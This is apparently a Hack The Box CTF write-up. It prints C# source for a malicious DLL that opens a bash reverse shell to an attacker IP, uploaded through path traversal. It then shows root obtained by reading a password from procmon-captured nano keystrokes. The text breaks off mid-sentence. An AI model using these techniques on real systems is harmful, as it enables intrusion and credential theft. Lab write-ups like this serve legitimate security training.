# Sea Heist - HTB Writeup

## PART 1: USER

### Getting access to the admin panel

### Upload reverse shell

Now that I have access to the admin panel, I will try to gain access to the system. Two intersting stuff.

1 - I can trigger some dll in `/opt/components`.
2 - I can upload files to `/var/www/sites/lantern.htb/static/images`.

Let's try to create a revshell with .NET framework and then upload it.

I don't now anything about C# so it's time to learn but don't expect very precise explanations.

First, let's find a revshell. I can use for example this [revshell](www.revshells.com).

After several unsucessfull text, it forgot about a very important part : The Blazor Framework. This application is using the Blazor framework, therefore, our malicous dll will need to use this framework also.

After a lots of tests on dll uploading (and just a little bit of LLM), I finally came to an end and this one is working !

Let's review the method.

First create a dotnet project : `dotnet new classlib -n uilop`.

Add this code in the `Class1.cs`.

```C#
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using System.Diagnostics;
using System.Threading.Tasks;

namespace uilop
{
    public class Component : ComponentBase
    {
        private string _shellOutput;

        protected override async Task OnInitializedAsync()
        {
            // Execute the reverse shell command asynchronously
            _shellOutput = await ExecuteReverseShellAsync();
        }

        private Task<string> ExecuteReverseShellAsync()
        {
            return Task.Run(() =>
            {
                try
                {
                    Process proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "/bin/bash",  // Use "cmd.exe" or "powershell.exe" on Windows
                            Arguments = "-c \"bash -i >& /dev/tcp/10.10.16.15/1234 0>&1\"",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            CreateNoWindow = true
                        }
                    };

                    proc.Start();

                    // Capture the output
                    string output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();

                    return output;
                }
                catch (Exception ex)
                {
                    return $"Error: {ex.Message}";
                }
            });
        }

        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            base.BuildRenderTree(builder);

            // Display the output from the reverse shell
            if (!string.IsNullOrEmpty(_shellOutput))
            {
                builder.AddContent(0, _shellOutput);
            }
            else
            {
                builder.AddContent(0, "Executing reverse shell...");
            }
        }
    }
}
```

Now let's compile it : `dotnet build`

Then I upload it and intercept the request with burpsuite. Some non ascii chars. Indeed it's blazor specific. Hopfully there is a burpsuite [extension] to read blazor !

![image](./deserialize.png)

Now let's try to path transversal and upload our dll to `/opt/components`. The path from `/var/www/sites/lantern.htb/static/images` should be `../../../../../../opt/components/uilop.dll`. I can edit the path and serialze the data. Then copying back to the inital request and send it !

![image](./send_serialize.png)

It have been uploaded :

![image](./upload_dll.png)

Now let's try to trigger it trought the search bar :

![image](./exec_revshell.png)

And boom ! Call back !

![image](./revsehll.png)

I can validate the user flag.

## PART 2: ROOT

I don't have the user password yet. However, there is a `.ssh` folder. And in it I find an ssh key that I can use.

Now the serious part. When connecting in ssh, I get a message :

Checking perms :

```bash
sudo -l
Matching Defaults entries for tomas on lantern:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomas may run the following commands on lantern:
    (ALL : ALL) NOPASSWD: /usr/bin/procmon
```

What about the mail :

```bash
cat /var/mail/tomas
From hr@lantern.htb Mon Jan 1 12:00:00 2023
Subject: Welcome to Lantern!

Hi Tomas,

Congratulations on joining the Lantern team as a Linux Engineer! We're thrilled to have you on board.

While we're setting up your new account, feel free to use the access and toolset of our previous team member. Soon, you'll have all the access you need.

Our admin is currently automating processes on the server. Before global testing, could you check out his work in /root/automation.sh? Your insights will be valuable.

Exciting times ahead!

Best.
```

Of course :

```bash
ls -la /root/automation.sh
ls: cannot access '/root/automation.sh': Permission denied
```

Running some test, I found that the script `/root/automation.sh` is running and his PID change every 5 minutes or so.

Let's use procmon and see what we can get out of this `sudo /usr/bin/procmon <PID> -c procmon.db`. And after a few minutes and about 7000 syscalls, let's investigate.

We can open the database using : `sudo /usr/bin/procmon-f procmon.db`. There is a log of thing, but the one that seems the most important is the `nano` process with the `write` syscall.

[image]

Let's try to see what's being written. To do so, the easiest will be to export the base to our local machine and use `sqlite3` as there is none on the remote machine. Using scp : `scp -i id_rsa -p tomas@lantern.htb:/home/tomas/procmon.db ./`

Now we can investigate : `sqlite3 procmon.db` Let's first check the different tables we have.

```bash
sqlite> .tables
ebpf      metadata  stats

sqlite> .schema stats
CREATE TABLE stats (
    syscall TEXT,
    count INTEGER,
    duration INTEGER);

sqlite> .schema metadata
CREATE TABLE metadata (
    startTime INT,
    startEpocTime TEXT);

sqlite> .schema ebpf
CREATE TABLE ebpf (
    pid INT,
    stacktrace TEXT,
    comm TEXT,
    processname TEXT,
    resultcode INTEGER,
    timestamp INTEGER,
    syscall TEXT,
    duration INTEGER,
    arguments BLOB);
```

So we will be mostly interested with the ebpf table. Let's take a closer look :

```bash
sqlite> SELECT * FROM ebpf LIMIT 15;
623|140484308424580$/usr/lib/x86_64-linux-gnu/libc.so.6!recvfrom|auditd|auditd|-11|18852227934508|recvfrom|2264|
626|140484307809079$/usr/lib/x86_64-linux-gnu/libc.so.6![UNKNOWN];261993006390$[UNKNOWN]|auditd|auditd|0|18852227965666|futex|1974|
626|140484308347071$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|auditd|auditd|62|18852227975845|write|10750|
626|140484308347071$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|auditd|auditd|447|18852227995322|write|3897|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002532219|write|16521|
425106|140343397575575$/usr/lib/x86_64-linux-gnu/libc.so.6!poll;433540$[UNKNOWN]|nano|nano|0|18853002566093|poll|6141| V�^�
425106|140343396697587$/usr/lib/x86_64-linux-gnu/libc.so.6!__libc_sigaction;146028888065$[UNKNOWN]|nano|nano|0|18853002612339|rt_sigaction|5020|
425106|140343397575575$/usr/lib/x86_64-linux-gnu/libc.so.6!poll;146028888065$[UNKNOWN]|nano|nano|0|18853002622709|poll|3677|0W�^�
425106|140343397575575$/usr/lib/x86_64-linux-gnu/libc.so.6!poll|nano|nano|0|18853002634391|poll|3306|0W�^�
425106|140343396697587$/usr/lib/x86_64-linux-gnu/libc.so.6!__libc_sigaction|nano|nano|0|18853002643658|rt_sigaction|2785|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002651994|write|6492|
425106|140343396697587$/usr/lib/x86_64-linux-gnu/libc.so.6!__libc_sigaction;140343398635392$[UNKNOWN]|nano|nano|0|18853002665128|rt_sigaction|2715|
425106|140343397575575$/usr/lib/x86_64-linux-gnu/libc.so.6!poll;140343398635392$[UNKNOWN]|nano|nano|0|18853002673324|poll|3156|�U�^�
425106|140343397575575$/usr/lib/x86_64-linux-gnu/libc.so.6!poll|nano|nano|0|18853002684535|poll|3136|�U�^�
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|1|18853002707648|write|6612|
```

It looks a bit messy. But let's select the info we need :

```bash
sqlite> SELECT * FROM ebpf  WHERE syscall LIKE 'write' AND processname LIKE 'nano' LIMIT 5;
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002532219|write|16521|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002651994|write|6492|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|1|18853002707648|write|6612|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|2|18853002722917|write|6622|
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18854003052688|write|19467|
```

Why is there nothing in the argument ? Might be because it's hex and can't be rendered directly as utf-8. Let's try with this :

```bash
sqlite> SELECT *, hex(arguments) FROM ebpf  WHERE syscall LIKE 'write' AND processname LIKE 'nano' LIMIT 5;
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002532219|write|16521||01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18853002651994|write|6492||01000000000000001B5B3F3235681B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|1|18853002707648|write|6612||0100000000000000085B3F3235681B28426563686F34432842205265000100000000000000E079713EA47F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|2|18853002722917|write|6622||010000000000000020513F3235681B28426563686F3443284220526500020000000000000040BA6C71D45500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18854003052688|write|19467||01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Indeed. Now let's dig further. When looking back at this image:

![image]

There is some write operation with a 0 resultcode. And the buffer seems empty. So let's get rid of these. And just to be sure, we can also sort by timestamp, to be sure to keep only what we need. The SQL request should look like this : `SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' and resultcode > 0 ORDER BY timestamp ;`

Let's get all of that data in a file : `sqlite3 procmon.db "SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' and resultcode > 0 ORDER BY timestamp ;" > procmon.txt`

And now, let's put this hexa to something kind of readable. `cat procmon.txt  | xxd -r -p > procmon-dec.txt`.

![image](./procmon-dec.png)

Okay. It does not make any sens. But. After looking at it again, again and again. And again. I found the follwing letters.

![image](./sudo.png)

`sudo` Hmmm. And all the letters just before `[?25h`. Let's check this pattern and see what we have :

`Q3dtwpBm | sudo ./backup.sh ech Q3Eddtdw3pMB | udo backup.sh [...]`

We are missing some letters here and then but let's try with thid password :

![alt text](root.png)

And here we are !P

## Final Toughts

There is a few issue that I need to resolve. For example why

